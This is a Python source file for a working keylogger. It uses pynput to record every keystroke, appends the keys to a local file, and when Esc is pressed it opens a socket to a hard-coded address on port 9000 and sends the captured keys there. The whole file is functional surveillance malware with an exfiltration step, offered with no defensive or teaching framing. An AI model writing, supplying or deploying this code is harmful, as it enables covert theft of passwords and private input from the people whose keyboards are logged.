import socket
import os
from pynput import keyboard
from threading import Thread

class Keylogger:
    def __init__(self):
        self.log = ""
        self.file_name = 'keylogs.txt'
        self.server_addr = ("192.168.122.182", 9000)

    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            self.log += " [" + str(key) + "] "
        print('Key pressed: ', key)

    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False

    def start_logger(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def write_log_to_file(self):
        if not os.path.exists(self.file_name):
            with open(self.file_name, 'w') as f:
                f.write('')
        with open(self.file_name, 'a') as f:
            f.write(self.log)
            print('Logs written to file successfully!')

    def send_logs_to_server(self):
        try:
            client = socket.socket()
            client.connect(self.server_addr)
            with open(self.file_name, 'r') as f:
                data = f.read()
                client.sendall(data.encode())
            print('Logs sent to server successfully!')
        except Exception as e:
            print('Failed to send logs:', str(e))
        finally:
            client.close()

    def start(self):
        logging_thread = Thread(target=self.start_logger)
        logging_thread.start()
        while logging_thread.is_alive():
            pass  # wait for the logger to stop
        print('Logger stopped, writing log file...')
        self.write_log_to_file()
        print('Sending logs to server...')
        self.send_logs_to_server()

if __name__ == '__main__':
    keylogger = Keylogger()
    keylogger.start()